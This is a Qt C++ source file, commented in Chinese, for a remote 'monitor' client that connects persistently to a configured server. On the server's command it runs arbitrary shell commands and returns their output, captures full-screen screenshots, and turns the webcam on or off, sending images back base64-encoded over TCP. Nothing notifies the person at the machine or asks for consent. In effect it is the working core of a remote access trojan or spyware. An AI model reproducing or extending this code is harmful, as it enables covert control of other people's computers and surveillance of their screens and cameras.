#include "MonitorSocket.h"
#include <QDebug>
#include <QJsonObject>
#include <QJsonDocument>
#include <QByteArray>
#include <QThread>
#include <QtEndian>
#include <QMutex>
#include "MonitorUtil.h"

MonitorSocket::MonitorSocket(MonitorConfig& config, QObject *parent) : QObject(parent), _config(config)
{
    _socket = new QTcpSocket(this);
    connect(_socket, SIGNAL(readyRead()), this, SLOT(slotReadyRead()));
    connect(_socket, SIGNAL(disconnected()), this, SLOT(slotDisconnected()));
    connect(_socket, SIGNAL(connected()), this, SLOT(slotConnected()));

    _heartbeatTimer = new QTimer(this);
    connect(_heartbeatTimer, SIGNAL(timeout()), this, SLOT(slotSendHeartbeat()));

    _camera = new MonitorCamera(this);
    connect(_camera, SIGNAL(imageCaptured(QByteArray&)), this, SLOT(slotImageCaptured(QByteArray&)));

    _disconnect = true;
}


/*
* 释放资源
*/
MonitorSocket::~MonitorSocket()
{

}


/*
* 连接服务器
*/
void MonitorSocket::connectServer()
{
    while (true)
    {
        qDebug() << "try conntect";
        if (MonitorUtil::ping(_config.getServerIP())){
            break;
        }
        QThread::sleep(3);
    }

    _socket->connectToHost(_config.getServerIP(), _config.getServerPort());
}


/*
* 启用心跳机制
*/
bool MonitorSocket::enableHeartbeat()
{
    if (_config.getHeartbeat() > 0)
    {
        _heartbeatTimer->start(_config.getHeartbeat());
        return true;
    }
    else
    {
        return false;
    }
}


/*
* 发送心跳包
*/
void MonitorSocket::sendHeartbeat()
{
   QJsonObject jsonObj;
   jsonObj.insert("CMD", CMD_HEARTBEAT);
   jsonObj.insert("Body", "");
   QJsonDocument doc(jsonObj);
   int len = this->write(doc.toJson());
   qDebug() << "send heartbeat len:" << len;
}


/*
* 发送执行cmd命令后返回的数据
*/
void MonitorSocket::sendExecuteCMDResult(const QString result)
{
   QJsonObject jsonObj;
   jsonObj.insert("CMD", CMD_EXECUTECMD);
   jsonObj.insert("Body", result);
   QJsonDocument doc(jsonObj);
   int len = this->write(doc.toJson());
   qDebug() << "send execute CMD result len:" << len;
}


/*
* 发送执行获取屏幕命令后返回的数据
*/
void MonitorSocket::sendGetFullScreenCMDResult(const QByteArray& result)
{
   QJsonObject jsonObj;
   jsonObj.insert("CMD", CMD_GETFULLSCREEN);
   jsonObj.insert("Body", QString(result.toBase64()));
   QJsonDocument doc(jsonObj);
   int len = this->write(doc.toJson());
   qDebug() << "send getFullScreen CMD result len:" << len << ":" << doc.toJson().length();
}



/*
* 得到一个完整包之后解析其内容信息
*/
void MonitorSocket::analyzeData(const QByteArray& buf)
{
    qDebug() << "recv from server:" << buf;
    QJsonObject json = QJsonDocument::fromJson(buf).object();
    int cmd = json.value("CMD").toInt();
    QString body = json.value("Body").toString();
    if (cmd == CMD_EXECUTECMD)
    {
        QString result = MonitorUtil::executeCmd(body);
        qDebug() << result;
        sendExecuteCMDResult(result);
    }
    else if (cmd == CMD_GETFULLSCREEN)
    {
        QByteArray imgBuf;
        if (MonitorUtil::grabFullScreen(&imgBuf))
        {
            sendGetFullScreenCMDResult(imgBuf);
        }
        else
        {
            qDebug() << "截屏失败";
        }
    }
    else if (cmd == CMD_STARTCAPTURE)
    {
        _camera->capture();
        qDebug() << "capture";
    }
    else if (cmd == CMD_COMPLETECAPTURE)
    {
        _camera->stop();
        qDebug() << "stop";
    }
}


/*
* 取bytearray前4个字节转成int类型
* 如果bytearray不足4个字节则默认返回0
*/
int MonitorSocket::byteArrayToInt(const QByteArray &bytes)
{
    if (bytes.length() < sizeof(int))
    {
        return 0;
    }

    int i = bytes[0] & 0x000000FF;
    i |= ((bytes[1] <<8)&0x0000FF00);
    i |= ((bytes[2] <<16)&0x00FF0000);
    i |= ((bytes[3] <<24)&0xFF000000);
    return i;
}



/*
* 当前数据传输过来时,会调用这个方法
*/
void MonitorSocket::slotReadyRead()
{
    /* 接收数据, 判断是否有数据, 如果有, 通过readAll函数获取所有数据 */
    while (_socket->bytesAvailable() > 0)
    {
         _recvBuf.append(_socket->readAll());
         while (_recvBuf.length() > 0)
         {
             int filedLength = sizeof(int);
             int dataLength = qFromBigEndian(byteArrayToInt(_recvBuf));
             int len = filedLength + dataLength;
             if (_recvBuf.length() >= len)
             {
                 analyzeData(_recvBuf.mid(filedLength, dataLength));
                 _recvBuf.remove(0, len);
             }
             else
             {
                 break;
             }
         }
    }
}


/*
* 远程服务断开连接,直接退出程序
*/
void MonitorSocket::slotDisconnected()
{
    qDebug() << "disconnected";
    this->connectServer();
}


/*
* 连接成功,修改连接状态标志位
*/
void MonitorSocket::slotConnected()
{
    _disconnect = false;
    qDebug() << "connected success";
    // 启用心跳机制
    enableHeartbeat();
}


/*
* 发送心跳包的事件处理
*/
void MonitorSocket::slotSendHeartbeat()
{
   sendHeartbeat();
}


/*
* 处理头像图片
*/
void MonitorSocket::slotImageCaptured(QByteArray& imageBuf)
{
    QJsonObject jsonObj;
    jsonObj.insert("CMD", CMD_COMPLETECAPTURE);
    jsonObj.insert("Body", QString(imageBuf.toBase64()));
    QJsonDocument doc(jsonObj);
    int len = this->write(doc.toJson());
    qDebug() << "send capture CMD result len:" << len << ":" <<   doc.toJson().length();
}


/*
* 写消息
* byteBuf: 内容数据
*/
int MonitorSocket::write(QByteArray byteBuf)
{
    // netty的解码器解析长度是以大端方式
    // 所以需要将小端转换成大端
    int bufLength = qFromBigEndian(byteBuf.length());
    QByteArray wrapByteBuf;
    wrapByteBuf.append((char*)&bufLength, sizeof(bufLength));
    wrapByteBuf.append(byteBuf);
    return _socket->write(wrapByteBuf);
}

